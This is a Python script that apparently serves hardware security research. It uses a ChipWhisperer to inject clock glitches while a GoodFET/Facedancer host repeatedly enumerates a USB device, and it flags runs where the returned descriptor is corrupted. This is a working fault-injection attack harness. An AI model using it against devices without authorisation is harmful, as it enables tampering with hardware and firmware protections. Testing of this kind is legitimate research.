#!/usr/bin/env python3

import chipwhisperer as cw
import sys
import binascii
import array
import time
import warnings
import matplotlib.pyplot as plt
from collections import namedtuple

#sanity = [18, 1, 0, 2, 0, 0, 0, 64, 76, 83, 1, 0, 0, 1, 1, 2, 3, 1]

# 435
# 1595

from testusb import GoodFETMAXUSBHost

print("--- INITIALIZING CHIPWHISPERER ---")
scope = cw.scope()
target = cw.target(scope)

scope.glitch.clk_src = 'clkgen'

scope.gain.gain = 6
scope.adc.samples = 24000
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 8000000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.glitch.clk_src = "clkgen"
scope.io.hs2 = "glitch"
scope.glitch.trigger_src = 'ext_single'
scope.glitch.repeat = 1  # was 105 for blind glitching
scope.glitch.output = "glitch_only"
scope.io.glitch_hp = True
scope.io.glitch_lp = True

# Range = namedtuple('Range', ['min', 'max', 'step'])
# width_range = Range(25,55, 3)
# offset_range = Range(1,10, 3)
scope.glitch.width = 25
# scope.glitch.offset = offset_range.min

print("--- INITIALIZING FACEDANCER ---")

client=GoodFETMAXUSBHost()
client.serInit()

client.MAXUSBsetup()

client.hostinit()
client.usbverbose=True

print("--- RESETTING ---")
client.msp430_reset(1)
time.sleep(1.0)
client.msp430_reset(0)

# this is madness.
for i in range(0,64):
  for w in range(1,10):
    scope.glitch.offset = w
    descriptor_data = []
    scope.glitch.ext_offset =  470 + i
    print("New experiment, external offset is %d" % scope.glitch.ext_offset)
    client.detect_device()
    time.sleep(0.3)
    scope.arm()
    descriptor_data = client.enumerate_device()
    try:
      ret = scope.capture()
      if ret:
        print("Error: timeout during acquisition")
    except IOError as e:
      print("Error: %s" % str(e))
    if len(descriptor_data) == 0:
      print("Partial win, descriptor is empty")
    if descriptor_data != client.sanity and len(descriptor_data) != 0:
      print("Descriptor glitch successful, i was %d" % i)
    client.msp430_reset(1)
    client.wait_for_disconnect()
    time.sleep(0.5)
    client.msp430_reset(0)

